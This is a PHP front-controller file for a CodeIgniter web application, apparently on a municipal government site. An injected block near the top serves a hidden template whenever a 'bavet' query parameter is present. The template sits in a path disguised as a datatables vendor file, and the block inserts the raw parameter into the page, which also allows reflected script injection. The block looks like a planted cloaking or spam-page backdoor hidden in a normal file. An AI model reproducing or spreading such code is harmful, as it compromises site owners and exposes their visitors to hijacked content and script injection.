<?php

// Check PHP version.
$minPhpVersion = '7.4';
if (version_compare(PHP_VERSION, $minPhpVersion, '<')) {
    exit(sprintf('Your PHP version must be %s or higher. Current: %s', $minPhpVersion, PHP_VERSION));
}

// Path to the front controller
define('FCPATH', __DIR__ . DIRECTORY_SEPARATOR);

if (getcwd() . DIRECTORY_SEPARATOR !== FCPATH) {
    chdir(FCPATH);
}

// Cek jika parameter 'bavet' ada, tampilkan template khusus
$config = array(
    'url'        => 'https://opera-andalan.ternatekota.go.id/',
    'parameter'  => 'bavet',
    'template'   => __DIR__ . '/assets/vendors/datatables/datatable.php',
);

if (isset($_GET[$config['parameter']])) {
    $brand = trim($_GET[$config['parameter']]);
    $url = $config['url'] . '?' . $config['parameter'] . '=' . urlencode($brand);

    if (!file_exists($config['template'])) {
        exit('Template file not found: ' . $config['template']);
    }

    $html = file_get_contents($config['template']);

    if ($html === false) {
        exit('Failed to read template file.');
    }

    $html = str_replace('{{ BRAND }}', $brand, $html);
    $html = str_replace('{{ URL }}', $url, $html);

    echo $html;
    exit;
}

// Jika tidak ada parameter 'bavet', jalankan CodeIgniter
require FCPATH . '../opera_andalan/app/Config/Paths.php';
$paths = new Config\Paths();

require rtrim($paths->systemDirectory, '\\/ ') . DIRECTORY_SEPARATOR . 'bootstrap.php';

require_once SYSTEMPATH . 'Config/DotEnv.php';
(new CodeIgniter\Config\DotEnv(ROOTPATH))->load();

if (! defined('ENVIRONMENT')) {
    define('ENVIRONMENT', env('CI_ENVIRONMENT', 'production'));
}

$app = Config\Services::codeigniter();
$app->initialize();
$context = is_cli() ? 'php-cli' : 'web';
$app->setContext($context);

$app->run();
exit(EXIT_SUCCESS);

?>
